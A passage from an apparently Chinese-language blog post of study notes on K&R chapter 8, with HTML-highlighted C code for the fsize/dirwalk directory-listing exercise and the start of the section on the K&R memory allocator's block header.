class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> NAME_MAX 14</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> &#123;</span></span><br><span class=\"line\">    <span class=\"type\">long</span> ino;</span><br><span class=\"line\">    <span class=\"type\">char</span> name[NAME_MAX+<span class=\"number\">1</span>];</span><br><span class=\"line\">&#125; Dirent;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span>&#123;</span></span><br><span class=\"line\">    <span class=\"type\">int</span> fd;</span><br><span class=\"line\">    Dirent d;</span><br><span class=\"line\">&#125; DIR1;</span><br><span class=\"line\"></span><br><span class=\"line\">DIR1 *<span class=\"title function_\">opendir1</span><span class=\"params\">(<span class=\"type\">char</span> *dirname)</span>;</span><br><span class=\"line\">Dirent *<span class=\"title function_\">readdir1</span><span class=\"params\">(DIR1 *dfd)</span>;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">closedir1</span><span class=\"params\">(DIR1 *dfd)</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;fcntl.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/types.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/stat.h&gt;</span></span></span><br><span class=\"line\"><span class=\"comment\">//#include &quot;dirent.h&quot;</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">fsize</span><span class=\"params\">(<span class=\"type\">char</span> *)</span>;</span><br><span class=\"line\"><span class=\"comment\">//int stat(char *,struct stat * );</span></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">dirwalk</span><span class=\"params\">(<span class=\"type\">char</span> *, <span class=\"type\">void</span> (*fcn)(<span class=\"type\">char</span> *))</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span> **argv)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (argc == <span class=\"number\">1</span>)</span><br><span class=\"line\">        fsize(<span class=\"string\">&quot;.&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span>(--argc &gt; <span class=\"number\">0</span>)</span><br><span class=\"line\">            fsize(*++argv);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">fsize</span><span class=\"params\">(<span class=\"type\">char</span> *name)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">stat</span> <span class=\"title\">stbuf</span>;</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (stat(name,&amp;stbuf) == <span class=\"number\">-1</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>,<span class=\"string\">&quot;fsize: can&#x27;t access %s\\n&quot;</span>,name);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ((stbuf.st_mode &amp; S_IFMT) == S_IFDIR)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;is a dir\\n&quot;</span>);</span><br><span class=\"line\">\t\tdirwalk(name, fsize);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%8ld %s\\n&quot;</span>,stbuf.st_size,name);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> MAX_PATH 1024</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">dirwalk</span><span class=\"params\">(<span class=\"type\">char</span> *dir,<span class=\"type\">void</span> (*fcn)(<span class=\"type\">char</span> *))</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">char</span> name[MAX_PATH];</span><br><span class=\"line\">    Dirent *dp;</span><br><span class=\"line\">    DIR1 *dfd;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ((dfd = opendir1(dir)) == <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>,<span class=\"string\">&quot;dirwalk: can&#x27;t open %s\\n&quot;</span>,dir);</span><br><span class=\"line\">        <span class=\"keyword\">return</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    \t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;here\\n&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">while</span> ((dp = readdir1(dfd)) != <span class=\"literal\">NULL</span>)&#123;</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;dp-&gt;name:%s&quot;</span>,dp-&gt;name);</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (<span class=\"built_in\">strcmp</span>(dp-&gt;name,<span class=\"string\">&quot;.&quot;</span>) ==<span class=\"number\">0</span> || <span class=\"built_in\">strcmp</span>(dp-&gt;name,<span class=\"string\">&quot;..&quot;</span>)==<span class=\"number\">0</span>)</span><br><span class=\"line\">            <span class=\"keyword\">continue</span>; <span class=\"comment\">//跳过自身和父目录</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"built_in\">strlen</span>(dir)+<span class=\"built_in\">strlen</span>(dp-&gt;name)+<span class=\"number\">2</span> &gt; <span class=\"keyword\">sizeof</span>(name))</span><br><span class=\"line\">            <span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>,<span class=\"string\">&quot;dirwalk: name %s/%s too long\\n&quot;</span>,dir,dp-&gt;name);</span><br><span class=\"line\">        <span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">            <span class=\"built_in\">sprintf</span>(name,<span class=\"string\">&quot;%s/%s&quot;</span>,dir,dp-&gt;name);</span><br><span class=\"line\">            (*fcn)(name);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    closedir1(dfd);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">DIR1 *<span class=\"title function_\">opendir1</span><span class=\"params\">(<span class=\"type\">char</span> *dirname)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"type\">int</span> fd;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">stat</span> <span class=\"title\">stbuf</span>;</span></span><br><span class=\"line\">\tDIR1 *dp;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> ((fd = open(dirname,<span class=\"number\">0</span>,O_RDONLY,<span class=\"number\">0</span>)) == <span class=\"number\">-1</span></span><br><span class=\"line\">\t|| fstat(fd,&amp;stbuf) == <span class=\"number\">-1</span></span><br><span class=\"line\">\t|| (dp = (DIR1 *) <span class=\"built_in\">malloc</span>(<span class=\"keyword\">sizeof</span>(DIR1))) == <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"literal\">NULL</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\tdp-&gt;fd = fd;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> dp;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/dir.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">ifndef</span> DIRSIZ</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> DIRSIZ 14</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">direct1</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">\t<span class=\"type\">ino_t</span> d_ino;</span><br><span class=\"line\">\t<span class=\"type\">char</span> d_name[DIRSIZ];</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">Dirent *<span class=\"title function_\">readdir1</span><span class=\"params\">(DIR1 *dp)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">direct1</span> <span class=\"title\">dirbuf</span>;</span></span><br><span class=\"line\">\t<span class=\"type\">static</span> Dirent d;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">while</span>(read(dp-&gt;fd,(<span class=\"type\">char</span> *)&amp;dirbuf,<span class=\"keyword\">sizeof</span>(dirbuf)) == <span class=\"keyword\">sizeof</span>(dirbuf))&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(dirbuf.d_ino == <span class=\"number\">0</span>)</span><br><span class=\"line\">\t\t<span class=\"keyword\">continue</span>;</span><br><span class=\"line\">\td.ino = dirbuf.d_ino;</span><br><span class=\"line\">\t<span class=\"built_in\">strncpy</span>(d.name, dirbuf.d_name,DIRSIZ);</span><br><span class=\"line\">\td.name[DIRSIZ] = <span class=\"string\">&#x27;\\0&#x27;</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> &amp;d;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">closedir1</span><span class=\"params\">(DIR1 *dp)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(dp)&#123;</span><br><span class=\"line\">\tclose(dp-&gt;fd);</span><br><span class=\"line\">\t<span class=\"built_in\">free</span>(dp);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n\n\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> NAME_MAX 14</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;fcntl.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/types.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/stat.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/dir.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> MAX_PATH 1024</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">dirwalk</span><span class=\"params\">(<span class=\"type\">char</span> *dir,<span class=\"type\">void</span> (*fcn)(<span class=\"type\">char</span> *))</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">char</span> name[MAX_PATH];</span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">dirent</span> *<span class=\"title\">dp</span>;</span></span><br><span class=\"line\">    DIR *dfd;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> ((dfd = opendir(dir)) == <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>,<span class=\"string\">&quot;dirwalk: can&#x27;t open %s\\n&quot;</span>,dir);</span><br><span class=\"line\">        <span class=\"keyword\">return</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">//printf(&quot;here\\n&quot;);</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> ((dp = readdir(dfd)) != <span class=\"literal\">NULL</span>)&#123;</span><br><span class=\"line\">        <span class=\"comment\">//printf(&quot;dp-&gt;name:%s&quot;,dp-&gt;d_name);</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (<span class=\"built_in\">strcmp</span>(dp-&gt;d_name,<span class=\"string\">&quot;.&quot;</span>) ==<span class=\"number\">0</span> || <span class=\"built_in\">strcmp</span>(dp-&gt;d_name,<span class=\"string\">&quot;..&quot;</span>)==<span class=\"number\">0</span>)</span><br><span class=\"line\">            <span class=\"keyword\">continue</span>; <span class=\"comment\">//跳过自身和父目录</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"built_in\">strlen</span>(dir)+<span class=\"built_in\">strlen</span>(dp-&gt;d_name)+<span class=\"number\">2</span> &gt; <span class=\"keyword\">sizeof</span>(name))</span><br><span class=\"line\">            <span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>,<span class=\"string\">&quot;dirwalk: name %s/%s too long\\n&quot;</span>,dir,dp-&gt;d_name);</span><br><span class=\"line\">        <span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">            <span class=\"built_in\">sprintf</span>(name,<span class=\"string\">&quot;%s/%s&quot;</span>,dir,dp-&gt;d_name);</span><br><span class=\"line\">            (*fcn)(name);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    closedir(dfd);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">fsize</span><span class=\"params\">(<span class=\"type\">char</span> *name)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">stat</span> <span class=\"title\">stbuf</span>;</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (stat(name,&amp;stbuf) == <span class=\"number\">-1</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>,<span class=\"string\">&quot;fsize: can&#x27;t access %s\\n&quot;</span>,name);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ((stbuf.st_mode &amp; S_IFMT) == S_IFDIR)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"comment\">//printf(&quot;is a dir\\n&quot;);</span></span><br><span class=\"line\">\t\tdirwalk(name, fsize);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%8ld %s\\n&quot;</span>,stbuf.st_size,name);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span> **argv)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (argc == <span class=\"number\">1</span>)</span><br><span class=\"line\">        fsize(<span class=\"string\">&quot;.&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span>(--argc &gt; <span class=\"number\">0</span>)</span><br><span class=\"line\">            fsize(*++argv);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<p>​\t其实那些opendir函数等都不需要自己实现(不过从练习的角度讲,可以自己实现) , 自己实现的话,记得要根据操作系统的情况, 把对应的结构体都修改了,否则就会出问题</p>\n<p><a href=\"https://github.com/Heatwave/The-C-Programming-Language-2nd-Edition/tree/master/chapter-8-the-unix-system-interface\">https://github.com/Heatwave/The-C-Programming-Language-2nd-Edition/tree/master/chapter-8-the-unix-system-interface</a></p>\n<p><a href=\"https://www.learntosolveit.com/cprogramming/chapter8/ex_8.5_fsize\">https://www.learntosolveit.com/cprogramming/chapter8/ex_8.5_fsize</a></p>\n<p>niubi: <a href=\"https://stackoverflow.com/questions/7381000/what-is-wrong-with-this-example-from-kr\">https://stackoverflow.com/questions/7381000/what-is-wrong-with-this-example-from-kr</a></p>\n<h2 id=\"8-7-存储分配程序实例\"><a href=\"#8-7-存储分配程序实例\" class=\"headerlink\" title=\"8.7 存储分配程序实例\"></a>8.7 存储分配程序实例</h2><p>​\t内存抽象成块的组织形式,以链表的形式进行组织,<strong>每个块都含有一个长度、指向下一个块的指针以及一个指向自身数据存储位置的指针.</strong></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"type\">long</span> Align; <span class=\"comment\">//按照long类型的边界对齐</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">union</span> <span class=\"title\">header</span>&#123;</span> <span class=\"comment\">//内存块的头部信息</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> &#123;</span></span><br><span class=\"line\">        <span class=\"class\"><span class=\"keyword\">union</span> <span class=\"title\">header</span> *<span class=\"title\">ptr</span>;</span> <span class=\"comment\">// 空闲块链表中的下一块</span></span><br><span class=\"line\">        <span class=\"type\">unsigned</span> size; <span class=\"comment\">// 当前块的大小</span></span><br><span class=\"line\">    &#125; s;</span><br><span class=\"line\">    Align x; <span class=\"comment\">//强制块的对齐 (效果就是8字节对齐,计算机中对齐通常取决于包含的最大基本数据类型的大小</span></span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">union</span> <span class=\"title\">header</span> <span class=\"title\">Header</span>;</span></span><br></pre></td></tr></table></figure>\n\n\n\n<p>malloc时,   ,找到的块太大的话,把尾部返回给用户,这样,初始块的头部只需要修改size就可以了</p>\n<img src=\"/c%E8%AF%AD%E8%A8%80%E5%9B%9E%E7%82%89%E9%87%8D%E9%80%A0-unix%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%8F%A3/Snipaste_2023-11-12_11-59-06.jpg\" alt=\"Snipaste_2023-11-12_11-59-06\" style=\"zoom:33%;\">\n\n\n\n<p>free时,寻找的首先是这样的情况,   bp &gt; p &amp;&amp; bp &lt; p-&gt;s.ptr</p>\n<img src=\"/c%E8%AF%AD%E8%A8%80%E5%9B%9E%E7%82%89%E9%87%8D%E9%80%A0-unix%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%8F%A3/9f55d85647f9035a945ab734b4d376be.png\" alt=\"9f55d85647f9035a945ab734b4d376be\" style=\"zoom: 50%;\">\n\n<p>如果不符合,看是否符合这种情况,即被释放的块在链表的开头或者末尾</p>\n<img src=\"/c%E8%AF%AD%E8%A8%80%E5%9B%9E%E7%82%89%E9%87%8D%E9%80%A0-unix%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%8F%A3/image-20231112121942990.png\" alt=\"image-20231112121942990\" style=\"zoom:50%;\">\n\n\n\n<p>最终代码</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stddef.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"type\">long</span> Align; <span class=\"comment\">//按照long类型的边界对齐</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">union</span> <span class=\"title\">header</span>&#123;</span> <span 